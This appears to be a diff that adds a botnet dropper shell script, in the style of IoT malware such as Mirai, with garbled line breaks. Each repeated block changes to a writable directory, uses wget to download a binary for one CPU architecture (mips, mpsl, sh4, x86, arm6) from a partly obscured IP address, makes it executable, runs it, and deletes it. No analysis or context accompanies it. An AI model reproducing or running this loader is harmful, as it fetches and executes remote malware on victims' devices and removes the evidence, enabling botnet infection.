@@ -1,0 +1,28 @@
+
+#!/bin
+/bash cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.mips;
+chmod +x Masked.mips; ./Masked.mips; rm -rf Masked.mips cd /tmp || cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.mpsl;
+chmod +x Masked.mpsl; ./Masked.mpsl; rm -rf Masked.mpsl cd /tmp || cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.sh4; chmod +x Masked.sh4; ./Masked.sh4; rm -rf Masked.sh4 cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.x86; chmod +x Masked.x86; ./Masked.x86; rm -rf Masked.x86 cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.arm6; chmod +x Masked.arm6; ./Masked.arm6; rm -rf Masked.arm6 cd /tmp
